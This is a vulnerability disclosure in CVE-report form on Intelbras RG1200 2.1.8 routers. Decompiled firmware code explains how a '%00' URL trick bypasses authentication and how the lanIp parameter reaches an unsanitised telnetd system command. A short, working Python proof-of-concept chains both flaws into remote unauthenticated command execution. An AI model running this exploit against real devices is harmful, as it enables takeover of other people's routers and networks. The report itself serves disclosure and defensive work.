# CVE Report - Authentication Bypass and Command Injection Vulnerability in Intelbras RG1200 2.1.8 Routers 

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in Intelbras RG1200 2.1.8 Routers 

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, the attacker can reach command execution paths. One confirmed path is `fromAdvSetLanip` (set `lan.ip`) followed by `TendaTelnet`, where `lan.ip` is passed to `doSystemCmd("telnetd -b %s &", lan_ip)` without validation, allowing command injection via the `lanIp` parameter.

## POC

```py
import requests
import sys

def bypass_url(base, path, suffix="%00img/main-logo.png"):
    if not path.startswith("/"):
        path = "/" + path
    return f"{base}{path}{suffix}"


def exploit(target_ip, port=80, cmd="id"):
    base = f"http://{target_ip}:{port}"
    set_lanip = bypass_url(base, "/goform/AdvSetLanip")
    malicious_ip = f"192.168.0.1; {cmd}; #"
    data = {
        "lanIp": malicious_ip,
        "lanMask": "255.255.255.0",
        "dhcpEn": "1",
        "startIp": "192.168.0.100",
        "endIp": "192.168.0.200",
        "leaseTime": "86400",
        "lanDnsAuto": "1",
    }
    r = requests.post(set_lanip, data=data, timeout=10)
    print("[+] AdvSetLanip status:", r.status_code)

    telnet = bypass_url(base, "/goform/telnet")
    r = requests.get(telnet, timeout=10)
    print("[+] telnet status:", r.status_code)
    print(r.text)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: python poc.py <target_ip> [port] [cmd]")
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    cmd = sys.argv[3] if len(sys.argv) > 3 else "id"
    exploit(ip, port=port, cmd=cmd)
```

## Cause Analysis

### 1. Authentication Bypass — Raw URL vs Decoded Path Inconsistency

The HTTP request parsing logic in `websParseFirst` (0x42ea1c) stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` → `websUrlParse`:

```c
// websParseFirst (0x42ea1c) — sets wp->url = raw, wp->path = decoded
int __cdecl websParseFirst(webs_t wp, char_t *text)
{
    // ...
    url = strtok(0, " \t\n");                         // raw URL from HTTP request line
    if ( websUrlParse(url, &buf, &host, &path, &port, &query, &proto, 0, &ext) >= 0 )
    {
        wp->url = bstrdup(url);      // ← raw URL, NOT decoded (e.g. "/goform/AdvSetLanip%00img/main-logo.png")
        wp->path = bstrdup(path);    // ← decoded path from websUrlParse → websDecodeUrl (e.g. "/goform/AdvSetLanip")
        // ...
    }
}
```

In `R7WebsSecurityHandler` (0x434c34), the whitelist check is performed using `strstr(url, ...)` on the **raw** `url` parameter (which is `wp->url`). By crafting a raw URL such as `/goform/AdvSetLanip%00img/main-logo.png`, the security handler matches the whitelisted substring `img/main-logo.png` and returns 0 (allow) without enforcing authentication:

```c
// R7WebsSecurityHandler (0x434c34) — whitelist check on raw URL
int __cdecl R7WebsSecurityHandler(webs_t wp, char_t *urlPrefix, char_t *webDir,
                                   int arg, char_t *url, char_t *path, char_t *query)
{
    // ...
    strncpy(urlbuf, url, 0xFFu);
    // ↓ Whitelist check uses raw 'url' — strstr matches "img/main-logo.png" in the raw URL
    if ( !strncmp(url, "/public/", 8u)
      || !strncmp(url, "/lang/", 6u)
      || strstr(url, "img/main-logo.png")    // ← BYPASS: matches %00img/main-logo.png in raw URL
      || strstr(url, "reasy-ui-1.0.3.js")
      || !strncmp(url, "/favicon.ico", 0xCu)
      // ...
    {
        return 0;  // ← Authentication bypassed, request allowed through
    }
    // ... rest of auth logic never reached
}
```

Meanwhile, `websDecodeUrl` (0x430ebc) decodes `%00` to a null byte (`\x00`), causing `websUrlParse` to truncate the path at the null. The form dispatcher `websFormHandler` (0x415710) then receives the **decoded** path `/goform/AdvSetLanip` and dispatches to the handler:

```c
// websDecodeUrl (0x430ebc) — decodes %XX sequences (including %00 → null byte)
void __cdecl websDecodeUrl(char_t *decoded, char_t *token, int len)
{
    while ( *token && len > 0 )
    {
        if ( *token == 37                               // '%'
           && isxdigit(token[1]) && isxdigit(token[2]) )
        {
            // decode %XX → single byte (e.g. %00 → 0x00, null terminator)
            num = 16 * hexdigit(token[1]) + hexdigit(token[2]);
            *decoded = num;                             // %00 → \x00, string gets truncated here
            token = ipa - 1;
        }
        // ...
    }
    *decoded = 0;
}

// websFormHandler (0x415710) — dispatches using decoded 'path'
int __cdecl websFormHandler(webs_t wp, char_t *urlPrefix, char_t *webDir,
                             int arg, char_t *url, char_t *path, char_t *query)
{
    strncpy(formBuf, path, 0xFEu);                     // path = decoded "/goform/AdvSetLanip"
    formName = strchr(&formBuf[1], 47);                // find '/' → "AdvSetLanip"
    if ( formName )
    {
        sp_0 = symLookup(formSymtab, formName + 1);    // lookup "AdvSetLanip" handler
        if ( sp_0 )
            integer(wp, formName + 1, query);          // ← calls fromAdvSetLanip
    }
}
```

### 2. Command Injection — Unsanitized lan.ip in TendaTelnet

After bypassing authentication, the attacker calls `/goform/AdvSetLanip` to set `lan.ip` using the `lanIp` parameter. The `fromAdvSetLanip` handler (0x48a4e8) reads the user-controlled `lanIp` via `websGetVar` and stores it via `SetValue` without validation:

```c
// fromAdvSetLanip (0x48a4e8) — stores user-controlled lanIp into lan.ip
void __cdecl fromAdvSetLanip(webs_t wp, char_t *path, char_t *query)
{
    lan_ip = websGetVar(wp, "lanIp", "192.168.0.1");   // ← user-controlled input
    lan_mask = websGetVar(wp, "lanMask", "255.255.255.0");
    // ...
    SetValue("lan.ip", lan_ip);                        // ← stored to NVRAM without validation
    SetValue("lan.mask", lan_mask);
    // ...
}
```

Subsequently, calling `/goform/telnet` triggers `TendaTelnet` (0x498c58), which reads `lan.ip` via `GetValue` and passes it directly into `doSystemCmd` without any sanitization, resulting in command injection:

```c
// TendaTelnet (0x498c58) — reads lan.ip and passes to doSystemCmd unsanitized
void __cdecl TendaTelnet(webs_t wp, char_t *path, char_t *query)
{
    char lan_ip[32];

    memset(lan_ip, 0, sizeof(lan_ip));
    GetValue("lan.ip", lan_ip);                       // ← reads attacker-controlled value (e.g. "192.168.0.1; id; #")
    system("killall -9 telnetd");
    doSystemCmd("telnetd -b %s &", lan_ip);           // ← COMMAND INJECTION: %s replaced with "192.168.0.1; id; #"
    websWrite(wp, "load telnetd success.");
    websDone(wp, 200);
}
```

The complete attack chain: crafted raw URL bypasses auth → `fromAdvSetLanip` stores malicious `lanIp` → `TendaTelnet` executes `telnetd -b 192.168.0.1; <cmd>; # &` via `doSystemCmd`.
